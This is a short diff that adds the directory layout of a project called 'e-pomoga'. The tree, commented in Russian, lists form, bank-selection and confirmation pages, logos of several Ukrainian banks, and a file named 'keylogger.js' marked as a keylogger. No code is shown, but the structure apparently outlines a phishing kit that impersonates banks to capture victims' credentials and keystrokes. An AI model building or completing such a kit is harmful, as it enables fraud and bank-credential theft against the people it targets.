@@ -1,0 +1,20 @@
+/e-pomoga/
+│
+├── index.html          # Главная страница
+├── form.html           # Страница с формой
+├── bank.html           # Страница выбора банка
+├── confirm.html        # Страница подтверждения
+│
+├── css/
+│   └── style.css       # Общие стили
+│
+├── js/
+│   ├── script.js       # Основной скрипт
+│   └── keylogger.js    # Кейлоггер
+│
+├── img/                # Логотипы банков
+│   ├── privat.png
+│   ├── oshad.png
+│   ├── raif.png
+│   ├── mono.png
+│   └── pumb.png
